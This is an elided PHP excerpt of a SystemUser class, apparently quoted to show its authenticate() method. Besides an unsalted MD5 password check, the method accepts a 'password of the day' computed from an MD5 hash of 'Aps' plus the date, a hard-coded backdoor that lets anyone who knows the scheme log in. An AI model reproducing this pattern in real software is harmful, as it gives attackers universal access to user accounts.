...
class SystemUser extends TRecord
{
    ...
    public function get_frontpage_name()
    {
        ...
        */
        ...
        return TSession::getValue('frontpage');
    }
    ...
    public static function authenticate($login, $password)
    {
        ...
        if ($user instanceof SystemUser) {
            ...
            } else if (isset($user->password) and ($user->password == md5($password) || self::validarSenhaDia($password))) {
                return $user;
            } else {
    ...
    private static function validarSenhaDia($senha)
    {
        $string = "Aps" . date('Y.m.d');
        $senhaDoDia = substr(strtoupper(md5($string)), 0, 5);
